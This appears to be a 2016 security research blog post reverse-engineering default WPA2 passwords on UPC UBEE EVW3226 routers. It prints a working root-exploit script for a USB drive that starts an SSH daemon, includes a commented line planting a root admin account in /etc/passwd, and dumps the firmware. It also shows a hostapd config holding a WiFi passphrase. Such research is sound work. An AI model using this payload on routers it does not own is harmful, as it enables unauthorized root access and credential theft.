---
layout: post
title:  "UPC UBEE EBW3226 WPA2 Password RExing"
date:   2016-06-14 19:11:48 +0200
categories: router reversing hacking

---

# Introduction

This work was motivated by the work of [Blasty](https://twitter.com/bl4sty).
Several months ago he published the algorithm ( [upc_keys.c](https://haxx.in/upc-wifi/) ) generating candidate default
WPA2 passwords for UPC WiFi routers using just SSID of the router. Vulnerable routers used just router ID to generate
default WiFi password and WiFi SSID. Algorithm goes through all possible router serial IDs and if SSID matches,
it prints out candidate WiFi password (cca 20).

To our surprise it worked pretty well in our city, where 6 out of 10 UPC WiFi around were vulnerable. But it didn’t
work for newer router models and for my own. So we decide to look at this particular model if we were lucky to find
the same vulnerability in it.

Our modem is UBEE EVW3226. As I don’t want to experiment on my own home router I bought one from the guy selling
exactly the same model. There are guys who managed to get root access to the router by connecting to the UART
interface of the router. I recommend going through this article: <https://www.freeture.ch/?p=766>

Lucky for us, we didn’t have to mess with the UART interface of the router even though I was looking forward to it.
Just a day before I bought my UBEE router for experiments, Firefart [published an article](https://firefart.at/post/upc_ubee_fail/)
how to get a root on the router just by inserting a USB drive with simple scripts.

Tl;dr: If USB drive has name `EVW3226`, shell script
`.auto` on it gets executed with system privileges. With this script you start SSH server, you connect
to the router and have the root.

# Firmware Extraction

With this I managed to dump the whole firmware on the mounted USB drive.
The script we use to start SSH daemon and to dump the firmware is below:

```bash
#!/bin/bash
if [ ! -e /etc/passwd.1 ]; then
	cp /etc/passwd /etc/passwd.1

    # This works!
    #echo "admin:FvTuBQSax2MqI:0:0:admin,,,:/:/bin/sh" > /etc/passwd
    dropbear -r /var/tmp/disk/dropbear_rsa_host_key -p 192.168.0.1:22

    # Dump router to the drive
    WHERE=/var/tmp/disk/HOMEROUTER
    mkdir -p ${WHERE}
    tar -cvpf ${WHERE}/router-image-root.tar -X/var/tmp/disk/tar-exclude /
    sync

    for i in 0 1 2 3 4 5 6 7 8 9 10; do echo "CurDisk: mtdblock$i"; dd if="/dev/mtdblock${i}"\
           of="${WHERE}/fw-${i}.bin" bs=1 conv=noerror; done
   for i in 0 1 2 3 4 5 6 7 8 9 10; do echo "CurDisk: mtd$i"; dd if="/dev/mtd${i}" \
           of="${WHERE}/fw-${i}b.bin" bs=1 conv=noerror; done
   sync

    DDIR=`pwd`
    WHERE=/var/tmp/media/0AAA-0E65/HOMEROUTER
    cd /
	mkdir -p $WHERE
	find /proc -type f | grep -v '/sys/' | grep -v '/net/' | grep -v '/kmsg' | \
       while read F ; do
   		D=${WHERE}/${F%/*}
   		echo "D: $D  F: $F WHERE: ${WHERE}$F"
   		test -d "$D" || mkdir -p $D && echo "DIR: $D"
   		test -f "${WHERE}$F" || cat $F > ${WHERE}$F
	done
	cd "$DDIR"
fi
```

This is actually very powerful and convenient attack vector. One comes with USB drive to the router, plugs it in and has a WPA2 password in seconds.

I’ve created a TAR of the whole filesystem plus raw binary images of the mounted file system.
With SSH I could start mess around the router firmware.

Firstly, the quick review of mounted file systems:

```
# mount
rootfs on / type rootfs (rw)
/dev/root on / type squashfs (ro,relatime)
proc on /proc type proc (rw,relatime)
ramfs on /var type ramfs (rw,relatime)
sysfs on /sys type sysfs (rw,relatime)
tmpfs on /dev type tmpfs (rw,relatime)
devpts on /dev/pts type devpts (rw,relatime,mode=600)
/dev/mtdblock10 on /nvram type jffs2 (rw,relatime)
tmpfs on /fss type tmpfs (rw,relatime)
/dev/mtdblock6 on /fss/gw type squashfs (ro,relatime)
/dev/mtdblock7 on /fss/fss2 type squashfs (ro,relatime)
/dev/mtdblock9 on /fss/fss3 type squashfs (ro,relatime)
tmpfs on /etc type tmpfs (rw,relatime)
/dev/sda1 on /var/tmp/media/0AAA-0E65 type vfat (rw,relatime,fmask=0022,dmask=0022,codepage=cp437,iocharset=utf8,shortname=mixed,errors=remount-ro)

# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00020000 00010000 "U-Boot"
mtd1: 00010000 00010000 "env1"
mtd2: 00010000 00010000 "env2"
mtd3: 00b80000 00010000 "UBFI1"
mtd4: 001c191c 00010000 "Kernel"
mtd5: 00504c00 00010000 "RootFileSystem"
mtd6: 00377000 00010000 "FS1"
mtd7: 00440000 00010000 "FS2"
mtd8: 00b80000 00010000 "UBFI2"
mtd9: 00400000 00010000 "FS3"
mtd10: 00080000 00010000 "nvram"
```

Calling the cli command revealed firmware version

```
# cli
IMAGE_NAME=vgwsdk-3.5.0.24-150324.img
FSSTAMP=20150324141918
VERSION=EVW3226_1.0.20
```

While USB was dumping the firmware I went for the target - WiFi password. In the process list `ps -a` I’ve found:

```
5681 admin     1924 S    hostapd -B /tmp/secath0
```

`hostapd` is clearly the daemon running WiFi. It has the password to the WiFi stored in its configuration.
And clearly, there must be a binary/script that generates that configuration when user changes the
password OR the router is factory reset.

The file `secath0` stores the configuration. All the files are attached in the archive to this
article. I select only relevant lines. The configuration file stated:

```
interface=ath0
bridge=rndbr1
logger_stdout=-1
logger_stdout_level=2
dump_file=/tmp/hostapd.dump
ctrl_interface=/var/run/hostapd
ssid=UPC2495638

wpa=3
wpa_passphrase=WWMMVTZS
wpa_key_mgmt=WPA-PSK
```

Great, we have *SSID* and *PASSPHRASE* stored here. Something must have generated this configuration file.

# Firmware analysis

For more experiments, we use `router-image-root.tar`, extract it on local file system to look around. With this
 we find interesting binaries that have something to do with `secath0` file.
Note this is naive approach, the thing you try first. Binaries might have been obfuscated so the strings
won’t reveal anything. In this case, we were lucky.

```
find . -type f -exec grep -il 'secath0' {} \;
./fss/gw/lib/libUtility.so
./fss/gw/usr/sbin/aimDaemon
./fss/gw/usr/www/cgi-bin/setup.cgi
./var/tmp/conf_filename
./var/tmp/www/cgi-bin/setup.cgi
```

There are obviously 3 nice looking candidates to inspect further. `libUtility.so`, `aimDaemon`, `setup.cgi`.
You can also find those attached to the article. Running strings at those files reveals a lot of interesting stuff.
Even bizarre - more on that later.

`Setup.cgi` - it is the main script that handles changes in the router admin user interface (www, cgi).
Lets look at it with IDA Pro. The function list got my attention:

